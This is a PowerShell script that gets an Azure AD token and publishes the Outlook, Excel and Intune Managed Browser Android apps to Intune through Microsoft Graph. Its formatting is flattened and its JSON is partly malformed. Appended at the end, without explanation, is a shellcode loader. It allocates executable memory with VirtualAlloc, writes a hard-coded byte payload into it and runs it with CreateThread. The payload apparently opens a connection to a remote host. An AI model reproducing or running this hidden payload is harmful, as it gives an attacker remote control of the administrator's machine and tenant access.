function Get-AuthToken {[cmdletbinding()]param([Parameter(Mandatory=$true)]$User)$userUpn = New-Object "System.Net.Mail.MailAddress" -ArgumentList $User$tenant = $userUpn.HostWrite-Host "Checking for AzureAD module..."$AadModule = Get-Module -Name "AzureAD" -ListAvailableif ($AadModule -eq $null) {Write-Host "AzureAD PowerShell module not found, looking for AzureADPreview"$AadModule = Get-Module -Name "AzureADPreview" -ListAvailable}if ($AadModule -eq $null) {write-hostwrite-host "AzureAD Powershell module not installed..." -f Redwrite-host "Install by running 'Install-Module AzureAD' or 'Install-Module AzureADPreview' from an elevated PowerShell prompt" -f Yellowwrite-host "Script can't continue..." -f Redwrite-hostexit}if($AadModule.count -gt 1){$Latest_Version = ($AadModule | select version | Sort-Object)[-1]$aadModule = $AadModule | ? { $_.version -eq $Latest_Version.version }if($AadModule.count -gt 1){$aadModule = $AadModule | select -Unique}$adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"$adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"}else {$adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"$adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"}[System.Reflection.Assembly]::LoadFrom($adal) | Out-Null[System.Reflection.Assembly]::LoadFrom($adalforms) | Out-Null$clientId = "d1ddf0e4-d672-4dae-b554-9d5bdfd93547"$redirectUri = "urn:ietf:wg:oauth:2.0:oob"$resourceAppIdURI = "https://graph.microsoft.com"$authority = "https://login.microsoftonline.com/$Tenant"try {$authContext = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.AuthenticationContext" -ArgumentList $authority$platformParameters = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.PlatformParameters" -ArgumentList "Auto"$userId = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.UserIdentifier" -ArgumentList ($User, "OptionalDisplayableId")$authResult = $authContext.AcquireTokenAsync($resourceAppIdURI,$clientId,$redirectUri,$platformParameters,$userId).Resultif($authResult.AccessToken){$authHeader = @{'Content-Type'='application/json''Authorization'="Bearer " + $authResult.AccessToken'ExpiresOn'=$authResult.ExpiresOn}return $authHeader}else {Write-HostWrite-Host "Authorization Access Token is null, please re-run authentication..." -ForegroundColor RedWrite-Hostbreak}}catch {write-host $_.Exception.Message -f Redwrite-host $_.Exception.ItemName -f Redwrite-hostbreak}}Function Test-JSON(){param ($JSON)try {$TestJSON = ConvertFrom-Json $JSON -ErrorAction Stop$validJson = $true}catch {$validJson = $false$_.Exception}if (!$validJson){Write-Host "Provided JSON isn't in valid JSON format" -f Redbreak}}Function Add-AndroidApplication(){[cmdletbinding()]param($JSON,$IconURL)$graphApiVersion = "Beta"$App_resource = "deviceAppManagement/mobileApps"try {if(!$JSON){write-host "No JSON was passed to the function, provide a JSON variable" -f Redbreak}if($IconURL){write-verbose "Icon specified: $IconURL"if(!(test-path "$IconURL")){write-host "Icon Path '$IconURL' doesn't exist..." -ForegroundColor RedWrite-Host "Please specify a valid path..." -ForegroundColor RedWrite-Hostbreak}$iconResponse = Invoke-WebRequest "$iconUrl"$base64icon = [System.Convert]::ToBase64String($iconResponse.Content)$iconExt = ([System.IO.Path]::GetExtension("$iconURL")).replace(".","")$iconType = "image/$iconExt"Write-Verbose "Updating JSON to add Icon Data"$U_JSON = ConvertFrom-Json $JSON$U_JSON.largeIcon.type = "$iconType"$U_JSON.largeIcon.value = "$base64icon"$JSON = ConvertTo-Json $U_JSONWrite-Verbose $JSONTest-JSON -JSON $JSON$uri = "https://graph.microsoft.com/$graphApiVersion/$($App_resource)"Invoke-RestMethod -Uri $uri -Method Post -ContentType "application/json" -Body $JSON -Headers $authToken}else {Test-JSON -JSON $JSON$uri = "https://graph.microsoft.com/$graphApiVersion/$($App_resource)"Invoke-RestMethod -Uri $uri -Method Post -ContentType "application/json" -Body $JSON -Headers $authToken}}catch {$ex = $_.Exception$errorResponse = $ex.Response.GetResponseStream()$reader = New-Object System.IO.StreamReader($errorResponse)$reader.BaseStream.Position = 0$reader.DiscardBufferedData()$responseBody = $reader.ReadToEnd();Write-Host "Response content:`n$responseBody" -f RedWrite-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"write-hostbreak}}write-hostif($global:authToken){$DateTime = (Get-Date).ToUniversalTime()$TokenExpires = ($authToken.ExpiresOn.datetime - $DateTime).Minutesif($TokenExpires -le 0){write-host "Authentication Token expired" $TokenExpires "minutes ago" -ForegroundColor Yellowwrite-hostif($User -eq $null -or $User -eq ""){$User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"Write-Host}$global:authToken = Get-AuthToken -User $User}}else {if($User -eq $null -or $User -eq ""){$User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"Write-Host}$global:authToken = Get-AuthToken -User $User}$iconUrl_Outlook = "C:\IntuneIcons\Outlook.png"$iconUrl_Excel = "C:\IntuneIcons\Excel.PNG"$iconUrl_Browser = "C:\IntuneIcons\IntuneBrowser.PNG"if(!(Test-Path "$iconUrl_Outlook")){Write-Host "Icon path for '$iconUrl_Outlook' doesn't exist, please specify a valid path..." -ForegroundColor RedWrite-Hostbreak}if(!(Test-Path "$iconUrl_Excel")){Write-Host "Icon path for '$iconUrl_Excel' doesn't exist, please specify a valid path..." -ForegroundColor RedWrite-Hostbreak}if(!(Test-Path "$iconUrl_Browser")){Write-Host "Icon path for '$iconUrl_Browser' doesn't exist, please specify a valid path..." -ForegroundColor RedWrite-Hostbreak}$Outlook = @"{"@odata.type": ""displayName": "Microsoft Outlook","description": "Microsoft Outlook","publisher": "Microsoft Corporation","isFeatured": true,largeIcon: {"@odata.type": ""type": "$iconType","value": "$base64icon"},"appStoreUrl": "https://play.google.com/store/apps/details?id=com.microsoft.office.outlook&hl=en","minimumSupportedOperatingSystem": {"@odata.type": ""v4_0": true}}"@$Excel = @"{"@odata.type": ""displayName": "Microsoft Excel","description": "Microsoft Excel","publisher": "Microsoft Corporation","isFeatured": true,largeIcon: {"@odata.type": ""type": "$iconType","value": "$base64icon"},"appStoreUrl": "https://play.google.com/store/apps/details?id=com.microsoft.office.excel&hl=en","minimumSupportedOperatingSystem": {"@odata.type": ""v4_0": true}}"@$Browser = @"{"@odata.type": ""displayName": "Intune Managed Browser","description": "Intune Managed Browser","publisher": "Microsoft Corporation","isFeatured": true,largeIcon: {"@odata.type": ""type": "$iconType","value": "$base64icon"},"appStoreUrl": "https://play.google.com/store/apps/details?id=com.microsoft.intune.mam.managedbrowser&hl=en","minimumSupportedOperatingSystem": {"@odata.type": ""v4_0": true}}"@write-host "Publishing" ($Outlook | ConvertFrom-Json).displayName -ForegroundColor Yellow$Create_Outlook = Add-AndroidApplication -JSON $Outlook -IconURL "$iconUrl_Outlook"Write-Host "Application created as $($Create_Outlook.displayName)/$($create_Outlook.id)"Write-Hostwrite-host "Publishing" ($Browser | ConvertFrom-Json).displayName -ForegroundColor Yellow$Create_Browser = Add-AndroidApplication -JSON $Browser -IconURL "$iconUrl_Browser"Write-Host "Application created as $($Create_Browser.displayName)/$($create_Browser.id)"Write-Hostwrite-host "Publishing" ($Excel | ConvertFrom-Json).displayName -ForegroundColor Yellow$Create_Excel = Add-AndroidApplication -JSON $Excel -IconURL "$iconUrl_Excel"Write-Host "Application created as $($Create_Excel.displayName)/$($create_Excel.id)"Write-Host$pOGa = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $pOGa -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x25,0x4e,0xe3,0x06,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$fK54=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($fK54.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$fK54,0,0,0);for (;;){Start-sleep 60};